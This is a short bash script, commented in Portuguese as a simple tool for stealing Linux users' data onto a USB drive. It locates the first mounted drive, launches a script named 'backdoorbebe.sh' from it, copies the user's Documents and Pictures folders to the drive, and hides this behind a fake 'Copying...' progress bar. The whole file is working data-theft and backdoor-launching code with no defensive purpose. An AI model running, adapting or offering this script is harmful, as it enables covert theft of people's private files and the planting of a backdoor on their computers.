#!/bin/bash
#SCRIPT SIMPLES PARA FURTO DE DADOS usuarios linux (pendrive)
touch K.txt

function exibir_(){
	( echo 20; sleep 1
         echo 40; sleep 1
         echo 60; sleep 1
         echo 80; sleep 1
         echo 100; sleep 1) |
        dialog --title "Copiando...." --gauge "Copia sendo executada" 8 40 50

	clear
}
function xdXD(){
# pega o nome do usuario e abre o diretorio dele
        us=$USER        
        cd /home/$us/
}
function recover(){
	#rx=$(ls /media/$us)
	ls /media/$us > K.txt
	q=$(head -1 K.txt)
 	echo $q
	
}
function go(){
	cp -r /home/$us/Documentos /media/$us/$q
	cp -r /home/$us/Imagens /media/$us/$q
}
function rast(){
	./media/$us/backdoorbebe.sh
}

xdXD
recover
rast
go
exibir_
rm K.txt
